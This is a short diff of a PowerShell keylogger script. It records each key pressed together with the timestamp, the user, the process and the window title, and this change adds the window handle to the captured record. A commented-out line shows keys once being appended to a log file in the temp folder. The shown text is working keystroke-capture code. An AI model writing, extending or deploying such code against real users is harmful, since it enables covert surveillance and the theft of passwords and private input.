@@ -118,16 +118,16 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                     
                     $info = @{
                         "Date" = Get-Date
+                        "WindowHandle" = if ($ActiveHandle) { $ActiveHandle } else { "Unknown" }
                         "ProcessName" = if ($Process.Name) { $Process.Name } else { "Unknown" }
                         "ProcessOwner" = if ($owner) { $owner } else { "Unknown" }
                         "MainWindowTitle" = if ($Process.MainWindowTitle) { $Process.MainWindowTitle } else { "Unknown" }
                         "KeyPressed" = $mychar.ToString()
                     }
 
-                    write-host "$($info.date) - Key [$($info.KeyPressed)] pressed by user [$($info.ProcessOwner)] with window [$($info.mainwindowtitle)] of process [$($info.processName)]."
+                    write-host "$($info.date) - Key [$($info.KeyPressed)] pressed by user [$($info.ProcessOwner)] into window with handle [$($info.windowhandle)] and title [$($info.mainwindowtitle)] associated with process [$($info.processName)]."
 
-                    $strokes += New-Object -TypeName PSObject -Property $info                                                    
-
+                    $strokes += New-Object -TypeName PSObject -Property $info    
 
 #					$logfile = "$env:temp\key.log"
 #					Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
